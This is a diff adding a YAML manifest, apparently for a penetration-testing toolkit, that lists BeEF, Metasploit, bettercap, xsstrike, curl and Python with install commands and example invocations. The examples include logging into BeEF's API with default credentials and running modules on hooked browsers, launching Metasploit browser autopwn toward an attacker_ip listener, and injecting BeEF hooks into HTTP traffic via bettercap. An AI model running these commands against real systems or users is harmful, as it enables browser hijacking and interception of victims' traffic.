@@ -1,0 +1,51 @@
+beef-xss:
+  description: "Browser Exploitation Framework — hook and exploit browsers via XSS"
+  category: "exploitation"
+  install_cmd: "apt-get install -y beef-xss"
+  verify_cmd: "which beef-xss"
+  examples:
+    - "beef-xss"
+    - "beef-xss --config /etc/beef-xss/config.yaml"
+
+curl:
+  description: "Interact with BeEF REST API for automation"
+  category: "exploitation"
+  install_cmd: "apt-get install -y curl"
+  verify_cmd: "curl --version"
+  examples:
+    - "curl -s -X POST http://beef:3000/api/admin/login -H 'Content-Type: application/json' -d '{\"username\":\"beef\",\"password\":\"beef\"}'"
+    - "curl -s 'http://beef:3000/api/hooks?token=TOKEN'"
+    - "curl -s 'http://beef:3000/api/modules?token=TOKEN'"
+    - "curl -s -X POST 'http://beef:3000/api/modules/SESSION_ID/MODULE_ID?token=TOKEN' -H 'Content-Type: application/json' -d '{}'"
+
+metasploit-framework:
+  description: "Metasploit integration for browser exploit delivery via BeEF"
+  category: "exploitation"
+  install_cmd: "apt-get install -y metasploit-framework"
+  verify_cmd: "msfconsole --version"
+  examples:
+    - "msfconsole -q -x 'use exploit/multi/browser/autopwn2; set LHOST attacker_ip; run'"
+
+python3:
+  description: "Python automation scripts for BeEF API interaction and mass module execution"
+  category: "exploitation"
+  install_cmd: "apt-get install -y python3 python3-pip && pip3 install requests"
+  verify_cmd: "python3 --version"
+  examples:
+    - "python3 -c \"import requests; r=requests.post('http://beef:3000/api/admin/login', json={'username':'beef','password':'beef'}); print(r.json())\""
+
+xsstrike:
+  description: "XSS detection tool to find hook injection points for BeEF"
+  category: "exploitation"
+  install_cmd: "pip3 install xsstrike"
+  verify_cmd: "xsstrike --help | head -n 1"
+  examples:
+    - "xsstrike -u 'http://target/page?param=test'"
+
+bettercap:
+  description: "MITM framework for injecting BeEF hooks into HTTP traffic"
+  category: "exploitation"
+  install_cmd: "apt-get install -y bettercap"
+  verify_cmd: "bettercap --version"
+  examples:
+    - "bettercap -eval 'set http.proxy.script beef-inject.js; http.proxy on'"
